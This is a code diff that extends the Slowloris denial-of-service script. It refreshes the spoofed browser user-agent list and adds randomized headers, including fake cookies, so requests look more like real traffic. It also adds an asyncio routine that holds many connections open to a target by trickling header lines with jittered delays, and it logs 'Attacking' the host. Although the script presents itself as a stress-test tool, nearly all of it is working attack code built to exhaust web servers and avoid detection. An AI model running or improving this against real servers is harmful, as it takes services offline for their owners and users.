@@ -1,10 +1,10 @@
-#!/usr/bin/env python3
 import argparse
 import logging
 import random
 import socket
 import sys
 import time
+import asyncio
 
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
@@ -116,31 +116,56 @@ if args.https:
 
 list_of_sockets = []
 user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    # Chrome (Desktop)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
+    # Firefox (Desktop)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    # Edge (Desktop)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36 Edg/124.0.2478.80",
+    # Safari (Mac)
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    # Chrome (Mobile)
+    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
+    # Firefox (Mobile)
+    "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
+    # Safari (iPhone)
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    # Safari (iPad)
+    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+    # Chrome (iOS)
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.91 Mobile/15E148 Safari/604.1",
+    # Edge (Android)
+    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36 EdgA/124.0.2478.80",
+    # Samsung Internet
+    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36 SamsungBrowser/25.0",
+    # Opera (Desktop)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36 OPR/109.0.5097.80",
+    # Brave (Desktop, looks like Chrome)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36",
+    # Vivaldi (Desktop)
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36 Vivaldi/6.7.3329.31",
+]
+
+
+# Expanded and randomized HTTP headers
+extra_headers = [
+    ("Cache-Control", ["no-cache", "max-age=0", "no-store", "public", "private"]),
+    ("Pragma", ["no-cache", "" ]),
+    ("Cookie", [
+        "sessionid=abcdef1234567890; path=/; HttpOnly",
+        "userid=42; theme=light;",
+        "csrftoken=deadbeef; secure",
+        "",
+    ]),
+    ("Accept-Encoding", ["gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "identity"]),
+    ("X-Requested-With", ["XMLHttpRequest", "" ]),
+    ("DNT", ["1", "0"]),
+    ("Connection", ["keep-alive", "close"]),
 ]
 
 setattr(socket.socket, "send_line", send_line)
@@ -226,6 +251,58 @@ def main():
         logging.debug("Sleeping for %d seconds", args.sleeptime)
         time.sleep(args.sleeptime)
 
+
+# ================== ASYNCIO VERSION (WIP) ===================
+async def slowloris_connection_async(host, port, use_ssl, randuseragent, sleeptime):
+    try:
+        reader, writer = await asyncio.open_connection(host, port, ssl=use_ssl)
+        # Send initial GET line
+        get_line = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
+        writer.write(get_line.encode("utf-8"))
+        # User-Agent
+        ua = random.choice(user_agents) if randuseragent else user_agents[0]
+        writer.write(f"User-Agent: {ua}\r\n".encode("utf-8"))
+        writer.write(b"Accept-language: en-US,en,q=0.5\r\n")
+        await writer.drain()
+
+        # Randomize extra headers
+        headers = extra_headers.copy()
+        random.shuffle(headers)
+        for name, values in headers:
+            value = random.choice(values)
+            if value:
+                writer.write(f"{name}: {value}\r\n".encode("utf-8"))
+        await writer.drain()
+
+        while True:
+            # Send keep-alive header with random value
+            keep_alive = f"X-a: {random.randint(1, 5000)}\r\n"
+            writer.write(keep_alive.encode("utf-8"))
+            await writer.drain()
+            # Randomized sleep for realism
+            await asyncio.sleep(sleeptime + random.uniform(-sleeptime/2, sleeptime/2))
+    except Exception as e:
+        logging.debug(f"[async] Socket error: {e}")
+
+
+async def async_main():
+    """
+    Asyncio-based main entry point for Slowloris.
+    """
+    host = args.host
+    port = args.port
+    use_ssl = args.https
+    randuseragent = args.randuseragent
+    sleeptime = args.sleeptime
+    socket_count = args.sockets
+
+    logging.info(f"[async] Attacking {host} with {socket_count} sockets.")
+    tasks = []
+    for _ in range(socket_count):
+        t = asyncio.create_task(slowloris_connection_async(host, port, use_ssl, randuseragent, sleeptime))
+        tasks.append(t)
+    # Optionally, add a metrics logger here
+    await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
     main()
